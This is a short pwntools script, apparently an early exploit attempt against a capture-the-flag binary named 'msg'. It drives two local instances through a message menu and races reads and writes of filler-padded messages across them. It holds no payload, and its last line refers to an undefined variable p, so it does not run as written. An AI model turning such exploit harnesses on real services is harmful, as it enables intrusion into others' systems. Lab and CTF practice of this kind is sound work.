#!/usr/bin/python
from pwn import *

context.log_level = 'DEBUG'
local = True

if local:
  p1 = process('../msg')
  p2 = process('../msg')

def new(p, msg):
  p.recvuntil('Exit')
  p.sendline('1')
  p.recvuntil('Msg ID : ')
  key = p.recvline()[:-1]
  p.recvuntil('msg:')
  p.sendline(msg)
  return key

def change(p, key, msg):
  p.recvuntil('Exit')
  p.sendline('2')
  p.recvuntil('ID : ')
  p.sendline(key)
  p.recvuntil('msg:')
  p.sendline(msg)

def load(p, key):
  p.recvuntil('Exit')
  p.sendline('3')
  p.recvuntil('ID : ')
  p.sendline(key)
  p.recvuntil('msg: ')
  msg = p.recvline()[:-1]
  return msg

raw_input()
for i in range(200):
  k = new(p1, 'a'*0x9c)
  load(p2, k)
  change(p2, k, 'a'*0x9c)
  load(p2, k)
  load(p1, k)

p.interactive()
